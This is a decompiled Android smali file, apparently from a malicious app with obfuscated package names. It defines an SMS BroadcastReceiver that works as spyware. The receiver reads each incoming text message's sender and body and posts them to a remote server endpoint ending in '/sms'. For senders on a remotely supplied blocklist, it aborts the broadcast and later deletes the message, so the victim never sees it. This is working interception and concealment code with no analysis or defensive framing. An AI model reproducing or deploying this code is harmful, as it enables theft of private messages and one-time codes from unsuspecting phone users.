.class public Lgqegwqg/bbebebefff/asdcdsac/smsreciver;
.super Landroid/content/BroadcastReceiver;
.source "sourcefile"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 37
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "smscontent"    # Ljava/lang/String;

    .line 165
    const-string v0, "\uc2dc\uc791"

    :try_start_0
    invoke-static {v0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 166
    const-string v0, "content://sms/"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 168
    .local v2, "uri":Landroid/net/Uri;
    nop

    .line 169
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    .line 171
    .local v0, "isRead":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 175
    const-string v1, "body"

    .line 176
    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    .line 178
    .local v1, "body":Ljava/lang/String;
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 181
    const-string v3, "_id"

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    .line 183
    .local v3, "id":I
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v5, "content://sms"

    .line 184
    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "_id="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    .line 183
    invoke-virtual {v4, v5, v6, v7}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 186
    .end local v1    # "body":Ljava/lang/String;
    .end local v3    # "id":I
    :cond_0
    goto :goto_0

    .line 191
    .end local v0    # "isRead":Landroid/database/Cursor;
    .end local v2    # "uri":Landroid/net/Uri;
    :cond_1
    goto :goto_1

    .line 188
    :catch_0
    move-exception v0

    .line 190
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ee"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 192
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method


# virtual methods
.method public a()Lorg/json/JSONArray;
    .locals 4

    .line 194
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 196
    .local v0, "jsonArray":Lorg/json/JSONArray;
    :try_start_0
    invoke-static {}, Ln/a/a/g/b;->a()Ln/a/a/g/b;

    move-result-object v1

    const-string v2, "blocklist"

    invoke-virtual {v1, v2}, Ln/a/a/g/b;->e(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 197
    .local v1, "rrr":Ljava/lang/String;
    const-string v2, "RRRrr"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 198
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, v2

    .line 199
    return-object v0

    .line 200
    .end local v1    # "rrr":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 201
    .local v1, "e":Lorg/json/JSONException;
    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "error"

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 202
    const-string v2, "01012341234"

    invoke-virtual {v0, v2}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 203
    return-object v0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 20
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .line 43
    move-object/from16 v1, p0

    const-string v2, "body"

    const-string v3, "getsms"

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v4, "pdus"

    invoke-virtual {v0, v4}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    move-object v4, v0

    check-cast v4, [Ljava/lang/Object;

    .line 44
    .local v4, "objs":[Ljava/lang/Object;
    array-length v5, v4

    const/4 v0, 0x0

    const/4 v6, 0x0

    :goto_0
    if-ge v6, v5, :cond_4

    aget-object v7, v4, v6

    .line 45
    .local v7, "obj":Ljava/lang/Object;
    move-object v0, v7

    check-cast v0, [B

    invoke-static {v0}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v8

    .line 46
    .local v8, "smsMessage":Landroid/telephony/SmsMessage;
    invoke-virtual {v8}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v9

    .line 47
    .local v9, "senderid":Ljava/lang/String;
    invoke-virtual {v8}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v10

    .line 49
    .local v10, "body":Ljava/lang/String;
    const-string v0, "egwewewgewgwegwegewg"

    invoke-static {v0, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 80
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver;->a()Lorg/json/JSONArray;

    move-result-object v0

    .line 81
    .local v0, "jsonArray":Lorg/json/JSONArray;
    const/4 v11, 0x0

    .line 82
    .local v11, "checkblock":Z
    const/4 v12, 0x0

    .local v12, "i":I
    :goto_1
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v13
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    if-ge v12, v13, :cond_1

    .line 83
    :try_start_1
    invoke-virtual {v0, v12}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v9, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-eqz v13, :cond_0

    .line 85
    const/4 v11, 0x1

    .line 82
    :cond_0
    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    .line 155
    .end local v0    # "jsonArray":Lorg/json/JSONArray;
    .end local v11    # "checkblock":Z
    .end local v12    # "i":I
    :catch_0
    move-exception v0

    move-object/from16 v15, p1

    move-object/from16 v17, v4

    move-object/from16 v18, v7

    move-object/from16 v19, v8

    goto/16 :goto_4

    .line 89
    .restart local v0    # "jsonArray":Lorg/json/JSONArray;
    .restart local v11    # "checkblock":Z
    :cond_1
    :try_start_2
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v12

    .line 90
    .local v12, "action":Ljava/lang/String;
    const-string v13, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    const-string v14, "event"

    if-eqz v13, :cond_3

    .line 91
    :try_start_3
    new-instance v13, Lorg/json/JSONObject;

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    .line 92
    .local v13, "objv":Lorg/json/JSONObject;
    const-string v15, "SMS"

    invoke-virtual {v13, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 93
    const-string v15, "sender"

    invoke-virtual {v13, v15, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 94
    invoke-virtual {v13, v2, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 96
    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v16, v0

    .end local v0    # "jsonArray":Lorg/json/JSONArray;
    .local v16, "jsonArray":Lorg/json/JSONArray;
    invoke-static {}, Li/a/a/q;->c()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/sms"

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lg/b/a;->b(Ljava/lang/String;)Lg/b/c/a$h;

    move-result-object v0

    .line 97
    invoke-virtual {v0, v13}, Lg/b/c/a$h;->s(Ljava/lang/Object;)Lg/b/c/a$h;

    const-string v15, "x-uid"
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    move-object/from16 v17, v4

    .end local v4    # "objs":[Ljava/lang/Object;
    .local v17, "objs":[Ljava/lang/Object;
    :try_start_4
    sget-object v4, Li/a/a/q;->a:Ljava/lang/String;

    .line 98
    invoke-virtual {v0, v15, v4}, Lg/b/c/a$h;->t(Ljava/lang/String;Ljava/lang/String;)Lg/b/c/a$h;

    sget-object v4, Lg/b/c/e;->g:Lg/b/c/e;

    .line 99
    invoke-virtual {v0, v4}, Lg/b/c/a$h;->v(Lg/b/c/e;)Lg/b/c/a$h;

    .line 100
    invoke-virtual {v0}, Lg/b/c/a$h;->u()Lg/b/c/a;

    move-result-object v0

    new-instance v4, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$a;

    invoke-direct {v4, v1}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$a;-><init>(Lgqegwqg/bbebebefff/asdcdsac/smsreciver;)V

    .line 101
    invoke-virtual {v0, v4}, Lg/b/c/a;->n(Lg/b/g/f;)V

    .line 112
    if-eqz v11, :cond_2

    .line 114
    invoke-virtual/range {p0 .. p0}, Landroid/content/BroadcastReceiver;->abortBroadcast()V

    .line 115
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    .line 116
    .local v0, "timer":Ljava/util/Timer;
    new-instance v4, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$b;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    move-object/from16 v15, p1

    :try_start_5
    invoke-direct {v4, v1, v15, v10}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$b;-><init>(Lgqegwqg/bbebebefff/asdcdsac/smsreciver;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 123
    .local v4, "timerTask":Ljava/util/TimerTask;
    move-object/from16 v18, v7

    move-object/from16 v19, v8

    .end local v7    # "obj":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .local v18, "obj":Ljava/lang/Object;
    .local v19, "smsMessage":Landroid/telephony/SmsMessage;
    const-wide/16 v7, 0xbb8

    :try_start_6
    invoke-virtual {v0, v4, v7, v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 126
    .end local v0    # "timer":Ljava/util/Timer;
    .end local v4    # "timerTask":Ljava/util/TimerTask;
    goto :goto_3

    .line 155
    .end local v11    # "checkblock":Z
    .end local v12    # "action":Ljava/lang/String;
    .end local v13    # "objv":Lorg/json/JSONObject;
    .end local v16    # "jsonArray":Lorg/json/JSONArray;
    .end local v18    # "obj":Ljava/lang/Object;
    .end local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v7    # "obj":Ljava/lang/Object;
    .restart local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    :catch_1
    move-exception v0

    goto :goto_2

    .line 127
    .restart local v11    # "checkblock":Z
    .restart local v12    # "action":Ljava/lang/String;
    .restart local v13    # "objv":Lorg/json/JSONObject;
    .restart local v16    # "jsonArray":Lorg/json/JSONArray;
    :cond_2
    move-object/from16 v15, p1

    move-object/from16 v18, v7

    move-object/from16 v19, v8

    .end local v7    # "obj":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v18    # "obj":Ljava/lang/Object;
    .restart local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    .line 128
    .local v0, "values":Landroid/content/ContentValues;
    const-string v4, "address"

    invoke-virtual {v0, v4, v9}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 129
    invoke-virtual {v0, v2, v10}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 130
    const-string v4, "read"

    const/4 v7, 0x1

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v0, v4, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 131
    const-string v4, "date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    invoke-virtual {v0, v4, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 132
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v7, "content://sms/"

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v4, v7, v0}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    goto :goto_3

    .line 155
    .end local v0    # "values":Landroid/content/ContentValues;
    .end local v11    # "checkblock":Z
    .end local v12    # "action":Ljava/lang/String;
    .end local v13    # "objv":Lorg/json/JSONObject;
    .end local v16    # "jsonArray":Lorg/json/JSONArray;
    .end local v18    # "obj":Ljava/lang/Object;
    .end local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v7    # "obj":Ljava/lang/Object;
    .restart local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    :catch_2
    move-exception v0

    move-object/from16 v15, p1

    :goto_2
    move-object/from16 v18, v7

    move-object/from16 v19, v8

    .end local v7    # "obj":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v18    # "obj":Ljava/lang/Object;
    .restart local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    goto :goto_4

    .line 90
    .end local v17    # "objs":[Ljava/lang/Object;
    .end local v18    # "obj":Ljava/lang/Object;
    .end local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    .local v0, "jsonArray":Lorg/json/JSONArray;
    .local v4, "objs":[Ljava/lang/Object;
    .restart local v7    # "obj":Ljava/lang/Object;
    .restart local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v11    # "checkblock":Z
    .restart local v12    # "action":Ljava/lang/String;
    :cond_3
    move-object/from16 v15, p1

    move-object/from16 v16, v0

    move-object/from16 v17, v4

    move-object/from16 v18, v7

    move-object/from16 v19, v8

    .line 137
    .end local v0    # "jsonArray":Lorg/json/JSONArray;
    .end local v4    # "objs":[Ljava/lang/Object;
    .end local v7    # "obj":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .restart local v16    # "jsonArray":Lorg/json/JSONArray;
    .restart local v17    # "objs":[Ljava/lang/Object;
    .restart local v18    # "obj":Ljava/lang/Object;
    .restart local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    :goto_3
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v3}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 138
    const-string v0, ""

    .line 140
    .local v0, "type":Ljava/lang/String;
    new-instance v4, Ld/a0/e$a;

    invoke-direct {v4}, Ld/a0/e$a;-><init>()V

    .line 141
    invoke-virtual {v4, v14, v3}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    const-string v7, "type"

    .line 142
    invoke-virtual {v4, v7, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 143
    invoke-virtual {v4}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v4

    .line 145
    .local v4, "inputData":Ld/a0/e;
    new-instance v7, Ld/a0/n$a;

    const-class v8, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {v7, v8}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 146
    invoke-virtual {v7, v4}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v7, Ld/a0/n$a;

    .line 147
    invoke-virtual {v7, v3}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v7, Ld/a0/n$a;

    .line 148
    invoke-virtual {v7}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v7

    check-cast v7, Ld/a0/n;

    .line 151
    .local v7, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-static {v8}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v8

    invoke-virtual {v8, v7}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    .line 158
    nop

    .end local v0    # "type":Ljava/lang/String;
    .end local v4    # "inputData":Ld/a0/e;
    .end local v7    # "oneTimeWorkRequest":Ld/a0/n;
    .end local v11    # "checkblock":Z
    .end local v12    # "action":Ljava/lang/String;
    .end local v16    # "jsonArray":Lorg/json/JSONArray;
    goto :goto_5

    .line 155
    :catch_3
    move-exception v0

    goto :goto_4

    .end local v17    # "objs":[Ljava/lang/Object;
    .end local v18    # "obj":Ljava/lang/Object;
    .end local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    .local v4, "objs":[Ljava/lang/Object;
    .local v7, "obj":Ljava/lang/Object;
    .restart local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    :catch_4
    move-exception v0

    move-object/from16 v15, p1

    move-object/from16 v17, v4

    move-object/from16 v18, v7

    move-object/from16 v19, v8

    .line 157
    .end local v4    # "objs":[Ljava/lang/Object;
    .end local v7    # "obj":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v17    # "objs":[Ljava/lang/Object;
    .restart local v18    # "obj":Ljava/lang/Object;
    .restart local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    :goto_4
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v7, "eee"

    invoke-static {v7, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 44
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v9    # "senderid":Ljava/lang/String;
    .end local v10    # "body":Ljava/lang/String;
    .end local v18    # "obj":Ljava/lang/Object;
    .end local v19    # "smsMessage":Landroid/telephony/SmsMessage;
    :goto_5
    add-int/lit8 v6, v6, 0x1

    move-object/from16 v4, v17

    goto/16 :goto_0

    .line 160
    .end local v17    # "objs":[Ljava/lang/Object;
    .restart local v4    # "objs":[Ljava/lang/Object;
    :cond_4
    return-void
.end method
